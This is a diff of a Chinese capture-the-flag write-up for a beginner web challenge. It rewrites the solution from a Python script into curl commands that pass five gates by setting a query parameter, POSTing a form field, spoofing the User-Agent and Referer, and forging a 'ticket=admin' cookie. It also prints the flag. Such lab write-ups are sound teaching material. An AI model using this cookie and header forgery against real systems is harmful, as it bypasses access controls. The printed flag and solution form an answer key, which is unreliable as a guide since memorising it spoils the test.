@@ -10,50 +10,51 @@
 
 ## 思路
 
-- 直接把页面当接口打：每一闸都会在 `<article class="card">` 里回显「第几闸过了」和下一闸要求，照着逐条满足即可。
-- 五闸依次是：GET 进入 → POST 且带 `submit=1` → User-Agent 自检 → Referer 必须是 `http://s3c-lab.internal/console` → Cookie 里 `ticket` 必须是管理员。
-- 第 2、3 闸可以一发同时满足：POST 带表单参数，UA 用脚本默认的 `S3C-Gate/1.0`。
-- 第 5 闸页面会先给一个 `ticket=guest`，把它改成 `ticket=admin` 再提交即可。
+- 页面每过一闸就在卡片里回显「第几闸过了」和下一闸的要求，照着提示逐条满足即可。
+- 五闸依次是：GET 带 `start=1` 进入 → POST 且带参数 `submit=1` → User-Agent 必须是 `S3C-Gate/1.0` → Referer 必须是 `http://s3c-lab.internal/console` → Cookie 里 `ticket` 必须是 `admin`。
+- 浏览器地址栏只能发 GET，后面几闸要自定义方法和头，索性全部在终端用 `curl` 一条条敲。
 
 ## 关键步骤
 
-1. `GET /?start=1`，拿到「第 2 / 5 闸，第一闸过了」。
-2. `POST /?start=1`，body `submit=1`，UA `S3C-Gate/1.0`，连过第二、三闸。
-3. 同一请求加 `Referer: http://s3c-lab.internal/console`，第四闸通过。
-4. 再加 `Cookie: ticket=admin`，第五闸通过，页面直接吐出通行令。
+1. 浏览器打开容器地址，页面显示「第 2 / 5 闸」，绿色条里写着「第一闸过了」，下面提示「请用 POST 提交，带上参数 submit=1」：
 
-```python
-import urllib.request, urllib.parse, http.cookiejar
+   ![通行签发机页面](img/02-gate-page.png)
 
-BASE = 'http://103.85.23.250:31531/'
-op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
+2. 换到终端，先发一条 GET，确认第一闸的状态并拿到服务端下发的 cookie：
 
-def req(path, data=None, headers=None):
-    h = {'User-Agent': 'S3C-Gate/1.0', 'Accept': 'text/html'}
-    h.update(headers or {})
-    body = urllib.parse.urlencode(data).encode() if data else None
-    if body:
-        h['Content-Type'] = 'application/x-www-form-urlencoded'
-    r = urllib.request.Request(BASE.rstrip('/') + path, data=body, headers=h)
-    with op.open(r, timeout=15) as resp:
-        return resp.status, resp.read().decode('utf-8', 'replace')
+   ```bash
+   curl -s -c ck.txt -A "S3C-Gate/1.0" "http://103.85.23.250:31531/?start=1"
+   ```
 
-req('/?start=1')
-req('/?start=1', data={'submit': 1})
-req('/?start=1', data={'submit': 1},
-    headers={'Referer': 'http://s3c-lab.internal/console'})
-st, html = req('/?start=1', data={'submit': 1},
-    headers={'Referer': 'http://s3c-lab.internal/console',
-             'Cookie': 'ticket=admin'})
-```
+   返回的页面是「第 2 / 5 闸」，提示同上。
 
-实测回显（脚本输出，逐闸推进到签发）：
+3. 改成 POST，带上 `submit=1`：
 
-![五闸逐条通过](img/01-gates.png)
+   ```bash
+   curl -s -b ck.txt -c ck.txt -A "S3C-Gate/1.0" -d "submit=1" "http://103.85.23.250:31531/?start=1"
+   ```
 
-页面本身长这样，卡片里就是下一闸的提示：
+   一次过了第二、三闸，页面跳到「第 4 / 5 闸」，提示「必须带 Referer，且来源为 http://s3c-lab.internal/console」。
 
-![通行签发机页面](img/02-gate-page.png)
+4. 补上 `Referer`：
+
+   ```bash
+   curl -s -b ck.txt -c ck.txt -A "S3C-Gate/1.0" -d "submit=1" -e "http://s3c-lab.internal/console" "http://103.85.23.250:31531/?start=1"
+   ```
+
+   页面跳到「第 5 / 5 闸」，提示「需要管理员凭证」，并且给出了一段前端脚本：检测到 cookie 里没有 `ticket` 就设成 `ticket=guest`。
+
+5. 把 `ticket` 直接改成 `admin` 再提交：
+
+   ```bash
+   curl -s -b "ticket=admin" -A "S3C-Gate/1.0" -d "submit=1" -e "http://s3c-lab.internal/console" "http://103.85.23.250:31531/?start=1" | grep -o "S3C{[^}]*}"
+   ```
+
+   页面显示「已签发通行令，五闸都过了」，flag 就在正文里，`grep` 直接把它抽出来：
+
+   ```text
+   S3C{g3t_p0st_ua_r3f3r3r_c00k13_74b1d0b9c529}
+   ```
 
 ## Flag
 
@@ -64,4 +65,5 @@ S3C{g3t_p0st_ua_r3f3r3r_c00k13_74b1d0b9c529}
 ## 踩坑 / 备注
 
 - 不要用 `POST /`（丢掉 `?start=1`）：第一闸只认 GET 查询参数 `start=1`，必须 `POST /?start=1` 才能同时满足「GET 参数 + POST 方法」。
-- 第 5 闸只校验 `Cookie` 头里的 `ticket` 值，脚本自己带 `ticket=admin` 即可，不必真的去改浏览器 cookie。
+- 第 5 闸只校验 `Cookie` 头里的 `ticket` 值，`-b "ticket=admin"` 直接带上就行，不必真去改浏览器 cookie。
+- 每一步都要把前面的条件一起带上（方法、参数、UA、Referer），少一样就退回上一次的闸。
